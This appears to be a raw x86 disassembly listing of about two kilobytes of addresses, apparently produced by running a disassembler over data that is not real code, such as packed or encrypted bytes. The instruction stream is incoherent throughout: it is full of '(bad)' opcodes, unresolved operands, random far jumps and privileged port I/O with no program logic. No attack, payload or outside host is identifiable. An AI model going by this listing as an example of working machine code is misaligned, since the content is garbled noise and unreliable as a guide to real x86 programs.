  4200c6:	repz inc ebx
  4200c8:	loopne 0x420056
  4200ca:	pop    eax
  4200cb:	xchg   DWORD PTR [edx],ecx
  4200cd:	xchg   ebp,eax
  4200ce:	adc    BYTE PTR [ebx],cl
  4200d0:	cmc    
  4200d1:	lahf   
  4200d2:	aaa    
  4200d3:	sbb    BYTE PTR [edx-0x1dd48b63],cl
  4200d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200da:	data16 add BYTE PTR [edx-0x511a41a5],0xaa
  4200e2:	sar    DWORD PTR [edx+eiz*1],cl
  4200e5:	fwait
  4200e6:	dec    DWORD PTR [ebx+0x7eef9d26]
  4200ec:	mov    ds:0x7c646ad4,eax
  4200f1:	and    BYTE PTR [ebx+ebp*4],dh
  4200f4:	out    dx,eax
  4200f5:	pop    ss
  4200f6:	fild   DWORD PTR [edx]
  4200f8:	jno    0x420092
  4200fa:	adc    al,0xb5
  4200fc:	sub    dl,BYTE PTR [ebx]
  4200fe:	push   esp
  4200ff:	enter  0xe186,0x51
  420103:	mov    edi,0xa1351e87
  420108:	in     eax,0xef
  42010a:	jo     0x420121
  42010c:	xchg   edx,eax
  42010d:	xlat   BYTE PTR ds:[ebx]
  42010e:	jnp    0x4200b1
  420110:	cs or  eax,eax
  420113:	sub    DWORD PTR [ebx],eax
  420115:	cwde   
  420116:	or     ch,dh
  420118:	pop    esp
  420119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42011a:	das    
  42011b:	and    al,0x75
  42011d:	in     al,0x9
  42011f:	ficomp DWORD PTR [ebp+0x6c]
  420122:	ret    
  420123:	xor    BYTE PTR ds:0xa92a3d15,al
  420129:	pop    esp
  42012a:	xchg   esi,eax
  42012b:	pop    edx
  42012c:	ret    
  42012d:	ss cld 
  42012f:	and    al,0x9f
  420131:	pop    es
  420132:	in     al,0xe2
  420134:	enter  0x7932,0x1c
  420138:	idiv   BYTE PTR [eax+0x58343b1a]
  42013e:	inc    edx
  42013f:	mov    dl,0x5a
  420141:	shr    DWORD PTR [ecx+0x68e12579],1
  420147:	mov    edx,0x9ace5fbd
  42014c:	push   ebp
  42014d:	into   
  42014e:	jmp    0x25c6:0x356ee167
  420155:	jmp    0x50cd6b64
  42015a:	and    esi,eax
  42015c:	sub    DWORD PTR [ebx-0x44b56d87],0x380ace8d
  420166:	adc    ebx,ecx
  420168:	push   0xffffffe4
  42016a:	push   ebp
  42016b:	nop
  42016c:	mov    BYTE PTR [esi+0x3e],bl
  42016f:	cs loope 0x420152
  420172:	test   eax,0x6d06913f
  420177:	leave  
  420178:	or     eax,ecx
  42017a:	in     al,dx
  42017b:	shl    BYTE PTR [edi],1
  42017d:	jmp    DWORD PTR [esi]
  42017f:	sub    al,0x8f
  420181:	imul   esi,ecx,0xa
  420184:	je     0x420155
  420186:	sbb    eax,DWORD PTR [edx-0x6f3509b6]
  42018c:	cmc    
  42018d:	retf   0xa404
  420190:	pop    edi
  420191:	mov    ecx,0x71079d23
  420196:	dec    esi
  420197:	jmp    0x50c5:0x136524e8
  42019e:	into   
  42019f:	sbb    DWORD PTR [esi-0x27d07ba1],ecx
  4201a5:	icebp  
  4201a6:	fnsave [ecx+0x135591b8]
  4201ac:	daa    
  4201ad:	pop    esi
  4201ae:	inc    esp
  4201af:	sbb    ebp,ecx
  4201b1:	mov    edi,DWORD PTR [edi+0x5350e86b]
  4201b7:	mov    si,WORD PTR [edx-0x43]
  4201bb:	jno    0x4201b0
  4201bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201be:	inc    esp
  4201bf:	sbb    bh,bh
  4201c1:	cmp    dl,BYTE PTR [ebp+0x6c]
  4201c4:	mov    BYTE PTR [ebx+0x15a1497c],ah
  4201ca:	fidivr DWORD PTR [esi]
  4201cc:	scas   eax,DWORD PTR es:[edi]
  4201cd:	stc    
  4201ce:	scas   al,BYTE PTR es:[edi]
  4201cf:	inc    esp
  4201d0:	sub    DWORD PTR [ebp-0x4b7e348c],0xffffffc0
  4201d7:	stos   BYTE PTR es:[edi],al
  4201d8:	add    dh,BYTE PTR [esi+edi*2]
  4201db:	test   eax,0x2a12544f
  4201e0:	rcr    BYTE PTR [ebp-0x1d35a205],0x36
  4201e7:	push   0xc8e2c766
  4201ec:	xor    BYTE PTR [ecx-0x68c1b2a5],0x7a
  4201f3:	or     al,0xe0
  4201f5:	iret   
  4201f6:	adc    DWORD PTR [esi+0x42aa07ef],0xbc02ad15
  420200:	fwait
  420201:	jle    0x42021d
  420203:	pop    eax
  420204:	mov    cl,0xb3
  420206:	jmp    0x941f48dc
  42020b:	imul   eax,DWORD PTR [ebx],0x6f26b254
  420211:	ja     0x420265
  420213:	dec    edi
  420214:	mov    ebx,0xb95c6115
  420219:	fldenv [ecx]
  42021b:	add    cl,BYTE PTR [edi]
  42021d:	or     dh,BYTE PTR [ebp-0x79e362d4]
  420223:	jg     0x42024d
  420225:	addr16 in al,dx
  420227:	push   esi
  420228:	ja     0x42022d
  42022a:	xor    ecx,esi
  42022c:	mov    edx,0xc7318d70
  420231:	mov    al,ds:0x12ef741a
  420236:	dec    edi
  420237:	nop
  420238:	(bad)
  42023b:	cwde   
  42023c:	jne    0x420217
  42023e:	cmp    BYTE PTR ds:0x5036da23,bh
  420244:	mov    ch,0x79
  420246:	jne    0x4202b2
  420248:	pushf  
  420249:	push   edi
  42024a:	popa   
  42024b:	adc    eax,0xb54b7ecf
  420250:	inc    eax
  420251:	test   BYTE PTR [edx],cl
  420253:	cld    
  420254:	dec    eax
  420255:	xor    ah,BYTE PTR [ebx-0x54ecc5b8]
  42025b:	xor    eax,0x62328456
  420260:	adc    edi,ebp
  420262:	push   es
  420263:	pop    esi
  420264:	fwait
  420265:	setg   BYTE PTR [ebx]
  420268:	(bad)  
  420269:	aam    0x83
  42026b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42026c:	clc    
  42026d:	push   es
  42026e:	add    DWORD PTR [esi-0x4d1a94a7],0x77c6bc44
  420278:	leave  
  420279:	mov    ch,0xcb
  42027b:	cmp    al,0x54
  42027d:	sub    eax,DWORD PTR [edx-0x17]
  420280:	xchg   esp,eax
  420281:	push   ebp
  420282:	push   edi
  420283:	in     al,0xdd
  420285:	pop    ds
  420286:	sub    DWORD PTR [edi],0x48609885
  42028c:	and    al,0x61
  42028e:	dec    esi
  42028f:	fsub   DWORD PTR [edi]
  420291:	es (bad) 
  420293:	call   0x25f50c93
  420298:	inc    ecx
  420299:	ror    BYTE PTR ds:0x817264ec,cl
  42029f:	xchg   ecx,eax
  4202a0:	mov    bl,al
  4202a2:	push   0xd87a945a
  4202a7:	jo     0x420324
  4202a9:	(bad)  
  4202aa:	xrelease mov BYTE PTR [eax-0x61396482],0xfd
  4202b2:	mov    DWORD PTR [edx+0x44aed5df],ebx
  4202b8:	outs   dx,DWORD PTR ds:[esi]
  4202b9:	test   eax,0xefa9bf80
  4202be:	test   bh,0x22
  4202c1:	and    eax,0x88706993
  4202c6:	dec    edx
  4202c7:	mov    BYTE PTR [edx+0x2a],ch
  4202ca:	add    al,0xc9
  4202cc:	les    ebp,FWORD PTR [ecx+eax*1+0x65]
  4202d0:	cld    
  4202d1:	ss ss stos DWORD PTR es:[edi],eax
  4202d4:	add    bh,dh
  4202d6:	adc    bh,bh
  4202d8:	repz sbb edi,DWORD PTR [eax-0x5e]
  4202dc:	pushf  
  4202dd:	dec    eax
  4202de:	sahf   
  4202df:	cli    
  4202e0:	(bad)  
  4202e1:	bound  esp,QWORD PTR [edi+0x4]
  4202e4:	(bad)  [ecx+0x71a60bae]
  4202ea:	aad    0xfc
  4202ec:	pop    es
  4202ed:	pop    ebp
  4202ee:	lea    esi,[edx]
  4202f0:	test   al,0xb8
  4202f2:	cmp    DWORD PTR ds:0x9ddf6746,ebx
  4202f8:	gs pusha 
  4202fa:	ror    DWORD PTR [edx],cl
  4202fc:	mov    DWORD PTR [edx+ecx*1+0x6],ecx
  420300:	test   BYTE PTR [esi-0x1043894c],dh
  420306:	out    0x7b,al
  420308:	test   al,0x1b
  42030a:	inc    ebx
  42030b:	mov    bh,0xf8
  42030d:	stc    
  42030e:	test   al,0xbe
  420310:	mov    ebx,0x60609bc8
  420315:	dec    edi
  420316:	pop    ss
  420317:	leave  
  420318:	cmp    DWORD PTR ds:0x1540ecbc,edi
  42031e:	pop    edx
  42031f:	mov    bl,0xbd
  420321:	scas   eax,DWORD PTR es:[edi]
  420322:	mov    esp,0xbe52ba5a
  420327:	and    esp,edi
  420329:	push   esp
  42032a:	dec    edx
  42032b:	push   esp
  42032c:	int3   
  42032d:	mov    edx,0x85c3e139
  420332:	dec    esi
  420333:	or     DWORD PTR [eax+0x5371965f],esp
  420339:	fcmovnbe st,st(2)
  42033b:	jmp    0xbc62596e
  420340:	rcl    DWORD PTR [eax],0x17
  420343:	mov    ds,WORD PTR [eax]
  420345:	stc    
  420346:	xchg   BYTE PTR [ecx+esi*4-0x1cd707fa],ch
  42034d:	mov    edi,0xf419e48
  420352:	mov    ah,ah
  420354:	aas    
  420355:	xchg   edx,eax
  420356:	push   esi
  420357:	lods   eax,DWORD PTR ds:[esi]
  420358:	popf   
  420359:	test   al,0x64
  42035b:	adc    edx,DWORD PTR [eax-0x2e7c6e79]
  420361:	fs add al,0x67
  420364:	xchg   edi,eax
  420365:	sbb    BYTE PTR [eax+0x76],dh
  420368:	leave  
  420369:	aas    
  42036a:	inc    edi
  42036b:	jg     0x4203d1
  42036d:	iret   
  42036e:	cmc    
  42036f:	add    BYTE PTR [ebx+ebp*2-0x19],ch
  420373:	fcomp  QWORD PTR [eax-0x21]
  420376:	leave  
  420377:	pop    es
  420378:	loopne 0x420376
  42037a:	aad    0xad
  42037c:	push   ds
  42037d:	inc    edi
  42037e:	pushf  
  42037f:	pop    ss
  420380:	repnz retf 0xd7a3
  420384:	push   ebp
  420385:	mov    ah,0xf7
  420387:	jmp    0x420395
  420389:	and    eax,0x4f2f4513
  42038e:	int    0x98
  420390:	mov    ebx,0x3213252c
  420395:	xchg   esp,eax
  420396:	popf   
  420397:	sbb    DWORD PTR [eax-0x17],esp
  42039a:	pop    edi
  42039b:	(bad)  [ecx+0x5b2f183]
  4203a1:	int    0x3b
  4203a3:	jmp    0x320c:0xe741fe5
  4203aa:	frstor [esi]
  4203ac:	ret    
  4203ad:	jg     0x420363
  4203af:	xchg   ebp,eax
  4203b0:	mov    ebx,0x4d6bfb8a
  4203b5:	mov    ds,WORD PTR [ebp-0x7]
  4203b8:	in     eax,0x51
  4203ba:	mov    cl,0xbf
  4203bc:	pop    es
  4203bd:	jno    0x42037d
  4203bf:	lea    eax,[edx+0x3f]
  4203c2:	mov    ah,0xb0
  4203c4:	inc    edx
  4203c5:	or     esi,DWORD PTR [ecx+ebp*4]
  4203c8:	test   BYTE PTR [edi-0x78c64b76],0x2b
  4203cf:	or     ch,ah
  4203d1:	iret   
  4203d2:	xor    edi,DWORD PTR [ecx]
  4203d4:	pushf  
  4203d5:	mov    cl,0x6b
  4203d7:	test   al,0xa9
  4203d9:	int    0x1b
  4203db:	out    dx,eax
  4203dc:	jnp    0x420417
  4203de:	inc    edx
  4203df:	lods   eax,DWORD PTR ds:[esi]
  4203e0:	inc    eax
  4203e1:	pop    esi
  4203e2:	lods   eax,DWORD PTR ds:[esi]
  4203e3:	clc    
  4203e4:	sbb    bl,ah
  4203e6:	(bad)  
  4203e7:	pop    ss
  4203e8:	prefetcht0 BYTE PTR [ebx]
  4203eb:	mov    ebx,0x2bcbf85b
  4203f0:	aam    0xd9
  4203f2:	cmc    
  4203f3:	aas    
  4203f4:	mov    al,0x65
  4203f6:	push   edi
  4203f7:	adc    DWORD PTR [esi+0x5f7aef7b],0xffffff95
  4203fe:	rcl    DWORD PTR [esi+ebx*1],cl
  420401:	xchg   DWORD PTR [eax+0xe522110],ebp
  420407:	out    dx,eax
  420408:	cmp    eax,0x2ce209c3
  42040d:	cld    
  42040e:	dec    eax
  42040f:	mov    esi,0xa850fef
  420414:	ret    0xd658
  420417:	push   edi
  420418:	test   DWORD PTR [esi],ebp
  42041a:	dec    ebp
  42041b:	pop    eax
  42041c:	stos   DWORD PTR es:[edi],eax
  42041d:	sub    esp,DWORD PTR [ebp+0x1a370009]
  420423:	(bad)  [ebp+0x19331a34]
  420429:	inc    ecx
  42042a:	jno    0x420481
  42042c:	push   ebp
  42042d:	or     ebp,DWORD PTR [edx]
  42042f:	cmp    al,0x52
  420431:	addr16 cmp edx,ebp
  420434:	rcl    BYTE PTR [esi],cl
  420436:	push   esp
  420437:	nop
  420438:	mov    ch,BYTE PTR [ecx]
  42043a:	pusha  
  42043b:	mov    edi,0x8ae36b38
  420440:	in     al,dx
  420441:	loopne 0x42044c
  420443:	cmp    BYTE PTR [esi],bl
  420445:	repnz adc ecx,esp
  420448:	aad    0x2e
  42044a:	mov    ch,BYTE PTR [edx+0x25]
  42044d:	push   0x74bd2638
  420452:	lods   eax,DWORD PTR ds:[esi]
  420453:	push   0x78
  420455:	in     al,0x2a
  420457:	into   
  420458:	sbb    bh,cl
  42045a:	mov    ch,0xdd
  42045c:	cld    
  42045d:	and    ah,bl
  42045f:	lea    ecx,[eax-0x6f172c94]
  420465:	inc    edi
  420466:	pop    ebx
  420467:	scas   al,BYTE PTR es:[edi]
  420468:	out    dx,al
  420469:	shl    BYTE PTR [edi],1
  42046b:	dec    esp
  42046c:	ins    DWORD PTR es:[edi],dx
  42046d:	xlat   BYTE PTR ds:[ebx]
  42046e:	out    0x40,eax
  420470:	jp     0x420459
  420472:	pop    ebx
  420473:	loop   0x4204e3
  420475:	push   ecx
  420476:	or     al,0xc5
  420478:	mov    ebx,0xad91db91
  42047d:	popf   
  42047e:	inc    edi
  42047f:	jp     0x42047c
  420481:	pop    es
  420482:	cld    
  420483:	lahf   
  420484:	pushf  
  420485:	mov    ebp,0xa686ff1b
  42048a:	cmp    edx,DWORD PTR [edi]
  42048c:	ret    
  42048d:	pop    edx
  42048e:	retf   
  42048f:	test   eax,0xe5af55fa
  420494:	push   esp
  420495:	test   BYTE PTR [eax-0x64e23997],dl
  42049b:	inc    edi
  42049c:	mov    ecx,0xcfc85833
  4204a1:	mov    esi,0x11b18e37
  4204a6:	or     DWORD PTR ds:0xb82cc50b,ecx
  4204ac:	enter  0x6b48,0x15
  4204b0:	push   esp
  4204b1:	test   al,0x44
  4204b3:	jge    0x420440
  4204b5:	inc    ecx
  4204b6:	inc    edx
  4204b7:	adc    al,0x85
  4204b9:	cmp    esp,DWORD PTR [esi+0x7bf45ccd]
  4204bf:	in     eax,dx
  4204c0:	scas   eax,DWORD PTR es:[edi]
  4204c1:	dec    esp
  4204c2:	xchg   edi,eax
  4204c3:	iret   
  4204c4:	jb     0x42053d
  4204c6:	jbe    0x420498
  4204c8:	sbb    dh,al
  4204ca:	stos   BYTE PTR es:[edi],al
  4204cb:	pushf  
  4204cc:	je     0x42045d
  4204ce:	xor    al,BYTE PTR [edi-0x4b0aafc9]
  4204d4:	add    eax,0x2763986f
  4204d9:	xchg   edx,eax
  4204da:	xchg   edi,eax
  4204db:	xchg   DWORD PTR [eax-0x53],eax
  4204de:	jns    0x420514
  4204e0:	cmp    BYTE PTR [ecx],al
  4204e2:	mov    cl,0x8
  4204e4:	jle    0x420486
  4204e6:	int    0x97
  4204e8:	and    ecx,esp
  4204ea:	and    esi,DWORD PTR [ebx]
  4204ec:	pusha  
  4204ed:	out    0x3c,eax
  4204ef:	ins    BYTE PTR es:[edi],dx
  4204f0:	js     0x420489
  4204f2:	int3   
  4204f3:	js     0x420479
  4204f5:	mov    DWORD PTR [ebx-0x23],edi
  4204f8:	aaa    
  4204f9:	cmp    esi,DWORD PTR [ebx+ecx*1]
  4204fc:	lods   eax,DWORD PTR ds:[esi]
  4204fd:	sub    ebp,DWORD PTR [ebx-0x15]
  420500:	mov    eax,0xc0a4673b
  420505:	sub    DWORD PTR [ecx-0x3b],0xfffffff5
  420509:	sub    eax,esp
  42050b:	loop   0x420512
  42050d:	ja     0x4204ec
  42050f:	setnp  BYTE PTR [esi]
  420512:	xchg   edx,eax
  420513:	cdq    
  420514:	(bad)  
  420515:	or     esp,DWORD PTR [eax+0x33a813fc]
  42051b:	ret    0xe058
  42051e:	or     al,0xa0
  420520:	mov    cl,0x31
  420522:	shl    DWORD PTR [eax-0x7342d536],cl
  420528:	xchg   edi,eax
  420529:	retf   
  42052a:	pop    ecx
  42052b:	loope  0x420570
  42052d:	mov    esp,0xa483a406
  420532:	ds in  al,0x3
  420535:	mov    al,ds:0xa70f5dc9
  42053a:	xchg   ebx,eax
  42053b:	sbb    eax,0xdc62c0c0
  420540:	push   edx
  420541:	cmp    bl,BYTE PTR [edx-0x46028f35]
  420547:	adc    BYTE PTR [ebx+0x37],dl
  42054a:	push   ebx
  42054b:	push   ebp
  42054c:	inc    esp
  42054d:	jmp    0x9285:0x61c67e9c
  420554:	pop    ss
  420555:	sbb    eax,0x7f746a3c
  42055a:	sahf   
  42055b:	int3   
  42055c:	sar    DWORD PTR [esi+0x7e],cl
  42055f:	or     edi,DWORD PTR [edi-0x28]
  420562:	ins    DWORD PTR es:[edi],dx
  420563:	fisubr DWORD PTR [ebp-0x618335a3]
  420569:	pop    es
  42056a:	(bad)  
  42056b:	xchg   ecx,eax
  42056c:	xchg   BYTE PTR [edx+0x3fb03ec8],cl
  420572:	add    DWORD PTR [ebp-0x51],ebp
  420575:	das    
  420576:	sbb    edi,DWORD PTR [esi+0x2dfcca83]
  42057c:	mov    ebp,0x91c215cf
  420581:	retf   
  420582:	sbb    eax,0xff281c0c
  420587:	pushf  
  420588:	jl     0x4205c6
  42058a:	ret    
  42058b:	and    DWORD PTR [ecx-0xfa1a969],esi
  420591:	and    ah,ch
  420593:	cmc    
  420594:	nop
  420595:	ins    DWORD PTR es:[edi],dx
  420596:	add    BYTE PTR [ebx],al
  420598:	pop    edi
  420599:	(bad)  
  42059a:	out    dx,eax
  42059b:	sbb    BYTE PTR [edx-0x3f8386b7],ch
  4205a1:	mov    WORD PTR [ecx-0x41],fs
  4205a4:	xchg   ebp,eax
  4205a5:	sbb    BYTE PTR [esp+eax*1-0x33],cl
  4205a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205aa:	sbb    eax,0x565104aa
  4205af:	mov    ds:0x269f530a,eax
  4205b4:	mov    bh,BYTE PTR [eax+ebp*2-0x3ed7013c]
  4205bb:	or     ch,BYTE PTR ds:0x9a9836e8
  4205c1:	int    0x1d
  4205c3:	out    dx,al
  4205c4:	jb     0x4205f4
  4205c6:	add    BYTE PTR [ecx-0x9],dh
  4205c9:	into   
  4205ca:	mov    eax,ds:0xae40e006
  4205cf:	push   ebp
  4205d0:	cli    
  4205d1:	push   0xcd5664b1
  4205d6:	popf   
  4205d7:	rol    BYTE PTR [eax],1
  4205d9:	cmp    bl,BYTE PTR [ebp-0x2568a333]
  4205df:	inc    ebx
  4205e0:	jge    0x4205c2
  4205e2:	xchg   ebx,eax
  4205e3:	js     0x42059e
  4205e5:	add    al,0x9f
  4205e7:	dec    ebx
  4205e8:	je     0x4205ea
  4205ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205eb:	sbb    al,0xb5
  4205ed:	js     0x4205af
  4205ef:	inc    ebp
  4205f0:	js     0x420668
  4205f2:	jg     0x4205c2
  4205f4:	xor    eax,DWORD PTR [eax]
  4205f6:	ins    DWORD PTR es:[edi],dx
  4205f7:	pusha  
  4205f8:	vcmppd xmm1,xmm7,xmm1,0x43
  4205fd:	cs jo  0x4205ea
  420600:	push   esp
  420601:	popf   
  420602:	push   edx
  420603:	dec    esp
  420604:	int    0x5f
  420606:	add    bl,al
  420608:	jbe    0x420595
  42060a:	jbe    0x420673
  42060c:	out    dx,al
  42060d:	ins    DWORD PTR es:[edi],dx
  42060e:	fidivr WORD PTR [ebp+0x7db33bba]
  420614:	jne    0x4205a3
  420616:	or     bl,cl
  420618:	xor    bl,BYTE PTR [ecx-0x65]
  42061b:	xchg   ebx,eax
  42061c:	push   ecx
  42061d:	les    edi,FWORD PTR [ebx+eax*1+0x7c]
  420621:	mov    BYTE PTR [ebp+ecx*1-0x35045ca7],ah
  420628:	mov    ecx,DWORD PTR ds:0x8fb51d5d
  42062e:	pop    esp
  42062f:	mov    edi,cs
  420631:	push   edx
  420632:	lds    ebp,FWORD PTR [edi-0x2]
  420635:	push   edx
  420636:	sbb    eax,0x34c15d53
  42063b:	mov    al,0xf
  42063d:	shl    DWORD PTR [ebp+eiz*1-0x92436cb],1
  420644:	jle    0x42066e
  420646:	aas    
  420647:	daa    
  420648:	dec    ecx
  420649:	jmp    FWORD PTR [ecx+eiz*4-0x788a3e70]
  420650:	cmp    al,0xcf
  420652:	and    eax,0xa73b7286
  420657:	jmp    0x3ef5:0xe75282d
  42065e:	mov    ds:0xc62d02d7,al
  420663:	and    bl,BYTE PTR [ecx+0x39caae99]
  420669:	xlat   BYTE PTR ds:[ebx]
  42066a:	in     al,0x78
  42066c:	gs js  0x420617
  42066f:	xor    BYTE PTR [edx-0x1ee7a988],bh
  420675:	aas    
  420676:	xor    DWORD PTR [edi+esi*4+0x41],edx
  42067a:	test   BYTE PTR [ebx],cl
  42067c:	bound  ebx,QWORD PTR [eax+0x47]
  42067f:	(bad)  
  420680:	int3   
  420681:	sub    eax,0x736c3b63
  420686:	leave  
  420687:	cmp    al,0x29
  420689:	mov    ecx,0x74eada3f
  42068e:	sar    DWORD PTR [ebp+edx*1-0x7b],cl
  420692:	fsub   QWORD PTR ds:0xcb587364
  420698:	out    dx,al
  420699:	and    cl,BYTE PTR [edx+ecx*1-0x77]
  42069d:	fs cmp eax,0x616c1530
  4206a3:	add    al,0x81
  4206a5:	dec    esp
  4206a6:	mov    eax,0xa5142982
  4206ab:	pop    es
  4206ac:	aaa    
  4206ad:	in     al,dx
  4206ae:	cmp    esp,DWORD PTR [esi]
  4206b0:	(bad)  
  4206b1:	sbb    al,0x91
  4206b3:	adc    eax,0xa02e077c
  4206b8:	or     BYTE PTR [ebp+0x68],dl
  4206bb:	pushf  
  4206bc:	mov    al,0x7f
  4206be:	pop    ebx
  4206bf:	inc    edi
  4206c0:	neg    BYTE PTR [ecx+eiz*8-0x30]
  4206c4:	shr    DWORD PTR [ebx],1
  4206c6:	icebp  
  4206c7:	scas   al,BYTE PTR es:[edi]
  4206c8:	pop    esi
  4206c9:	fild   WORD PTR [edi+edx*4+0x63]
  4206cd:	mov    al,ds:0x696a16cb
  4206d2:	sub    eax,0xec831858
  4206d7:	out    dx,al
  4206d8:	pop    esp
  4206d9:	push   esp
  4206da:	xchg   dh,ah
  4206dc:	hlt    
  4206dd:	lahf   
  4206de:	fistp  DWORD PTR [ebx-0x5ed067b8]
  4206e4:	adc    BYTE PTR [ecx-0x2e],al
  4206e7:	sbb    BYTE PTR [edi-0x442355d6],0x89
  4206ee:	stc    
  4206ef:	call   0xacf4:0x5d5568e4
  4206f6:	pop    esp
  4206f7:	repz dec ebp
  4206f9:	out    0x12,al
  4206fb:	(bad)
  4206ff:	mov    dl,0x14
  420701:	jno    0x420755
  420703:	lea    ebx,[eax]
  420705:	mov    esi,0x54780be
  42070a:	add    al,0xe2
  42070c:	xchg   edi,eax
  42070d:	mov    cl,0x47
  42070f:	adc    esp,DWORD PTR [edx+eiz*4]
  420712:	add    cl,BYTE PTR [ecx+0x29a37575]
  420718:	sbb    al,0x15
  42071a:	ins    DWORD PTR es:[edi],dx
  42071b:	xor    dl,BYTE PTR [edx]
  42071d:	clc    
  42071e:	mov    ds,WORD PTR [edx-0x6e]
  420721:	sub    DWORD PTR [ebx-0x521743f3],ebp
  420727:	pop    ss
  420728:	xchg   DWORD PTR [ebx],esi
  42072a:	ret    
  42072b:	rol    BYTE PTR [edi],1
  42072d:	mov    ebx,0xb7ab737c
  420732:	xchg   ecx,eax
  420733:	jge    0x420708
  420735:	sbb    BYTE PTR [ebp-0x13],ah
  420738:	sbb    ecx,DWORD PTR [ebx]
  42073a:	adc    ecx,esi
  42073c:	pop    ss
  42073d:	or     BYTE PTR [edx+0x5a0523ae],bh
  420743:	cmp    bl,BYTE PTR [eax]
  420745:	fisttp WORD PTR [edi+ecx*1]
  420748:	sar    bh,0x14
  42074b:	dec    esi
  42074c:	in     eax,0x9d
  42074e:	je     0x420728
  420750:	and    bl,BYTE PTR ds:0xf5bba245
  420756:	mov    ds:0x1fd4e9eb,al
  42075b:	mov    dh,0xc5
  42075d:	or     eax,DWORD PTR [ebp-0x2200ec65]
  420763:	sub    BYTE PTR ds:0x4f85ae7,bh
  420769:	js     0x420765
  42076b:	push   es
  42076c:	fisttp QWORD PTR [ecx+0x3dc324ba]
  420772:	iret   
  420773:	fcmovnbe st,st(7)
  420775:	mov    bl,0xff
  420778:	sbb    ah,dl
  42077a:	shl    BYTE PTR [ebx+0x46],cl
  42077d:	mov    dh,0x5a
  42077f:	mov    ds:0xc78d92f2,eax
  420784:	mov    ecx,0x1876ba87
  420789:	add    ebp,ebp
  42078b:	cdq    
  42078c:	mov    DWORD PTR [edx],esi
  42078e:	xor    eax,0x9ec248c3
  420793:	mov    ebp,?
  420795:	push   ds
  420796:	ficom  WORD PTR [esi-0x5c304df2]
  42079c:	(bad)  
  42079d:	xchg   edx,eax
  42079e:	outs   dx,BYTE PTR ds:[esi]
  42079f:	jl     0x4207c8
  4207a1:	(bad)  
  4207a2:	push   0xa933a77a
  4207a7:	inc    ebp
  4207a8:	jbe    0x420772
  4207aa:	jecxz  0x4207b0
  4207ac:	cmp    esi,DWORD PTR [ebx+0x33be8c36]
  4207b2:	dec    ecx
  4207b3:	push   esp
  4207b4:	call   0x6c53:0xa71b342b
  4207bb:	mov    dh,0xa6
  4207bd:	add    bh,BYTE PTR [eax+0x75]
  4207c0:	mov    cl,0x55
  4207c2:	jmp    0x1e6c:0xf8246b63
  4207c9:	or     BYTE PTR [eax-0x66],dh
  4207cc:	(bad)  
  4207ce:	add    DWORD PTR [eax+0x63],edx
  4207d1:	not    dh
  4207d3:	lds    eax,FWORD PTR [ebx]
  4207d5:	xor    BYTE PTR [esi-0x14],dl
  4207d8:	sbb    al,0x5b
  4207da:	arpl   WORD PTR [ebx+0xf3cfed6],si
  4207e0:	fild   QWORD PTR [ecx+0x12faffbb]
  4207e6:	jg     0x420771
  4207e8:	jle    0x420808
  4207ea:	out    dx,al
  4207eb:	dec    ebp
  4207ec:	cs mov cl,0x48
  4207ef:	add    eax,0x5fd8c6f8
  4207f4:	fist   WORD PTR [esi]
  4207f6:	add    al,0xd4
  4207f8:	sahf   
  4207f9:	aaa    
  4207fa:	mov    ah,0x5c
  4207fc:	mov    eax,0x70016993
  420801:	inc    edx
  420802:	push   edx
  420803:	xchg   ecx,eax
  420804:	leave  
  420805:	fcom   DWORD PTR [esi+0x257b3851]
  42080b:	rol    BYTE PTR [ebx-0x13cae5b0],0xb
  420812:	push   esp
  420813:	xlat   BYTE PTR ds:[ebx]
  420814:	and    dl,BYTE PTR [ebx-0x21]
  420817:	outs   dx,DWORD PTR ds:[esi]
  420818:	sbb    al,0x2f
  42081a:	leave  
  42081b:	adc    ebp,eax
  42081d:	in     eax,dx
  42081e:	pop    es
  42081f:	sahf   
  420820:	std    
  420821:	mov    ?,WORD PTR [ebp-0x1b]
  420824:	jmp    0x42080b
  420826:	lds    ecx,FWORD PTR [esi-0x1d5067c4]
  42082c:	or     DWORD PTR [ecx-0x44b6d4be],0xffffffc2
  420833:	ucomiss xmm7,DWORD PTR [edx+0x7445c0c0]
  42083a:	jae    0x42084e
  42083c:	dec    esi
  42083d:	jge    0x420837
  42083f:	cs jecxz 0x420835
  420842:	mov    dh,0x78
  420844:	xchg   edi,eax
  420845:	out    dx,al
  420846:	div    DWORD PTR [esp+ebx*4]
  420849:	sbb    edx,0x621614e4
  42084f:	cwde   
  420850:	ds call 0x878a:0x5593e2dd
  420858:	mov    ch,ah
  42085a:	mov    edi,DWORD PTR [ecx]
  42085c:	sbb    ch,BYTE PTR [ebp-0x2e]
  42085f:	inc    ecx
  420860:	outs   dx,BYTE PTR ds:[esi]
  420861:	xchg   ebp,eax
  420862:	rcr    BYTE PTR [ebx],0xd9
  420865:	bound  ecx,QWORD PTR [edi-0x137f715d]
  42086b:	adc    al,0xdb
  42086d:	dec    ebp
  42086e:	mov    bh,0xf2
  420870:	xlat   BYTE PTR ds:[ebx]
  420871:	fwait
  420872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420873:	hlt    
  420874:	mov    ah,BYTE PTR [ecx+0x36]
  420877:	(bad)  
  420878:	mov    edx,0xbc75fb69
  42087d:	ja     0x4208d9
  42087f:	mov    ds:0x12e73918,eax
  420884:	add    eax,0xbda463f9
  420889:	dec    ecx
  42088a:	mov    dl,0x8b
  42088c:	(bad)  
  42088d:	cmp    esi,ebp
  42088f:	out    dx,al
  420890:	fcomp  QWORD PTR [edx]
  420892:	loopne 0x4208ef
  420894:	sub    BYTE PTR [edx+0x2d6f0658],cl
  42089a:	rcl    ah,1
  42089c:	xchg   ebx,eax
  42089d:	sbb    bh,BYTE PTR [ebx-0x3c]
  4208a0:	jne    0x42089f
  4208a2:	out    dx,eax
  4208a3:	or     ah,BYTE PTR [ecx]
  4208a5:	mov    ebx,0x8046243b
  4208aa:	cmp    eax,DWORD PTR [edx-0xfd021ac]
  4208b0:	imul   ebp,DWORD PTR [esi-0xa4a9e6a],0x900e1721
  4208ba:	mov    ch,0xf3
  4208bc:	stos   BYTE PTR es:[edi],al
  4208bd:	je     0x42091a
  4208bf:	sbb    ebp,edx
  4208c1:	push   esp
  4208c2:	jl     0x42089b
  4208c4:	sub    ebx,DWORD PTR [ebp+0xc]
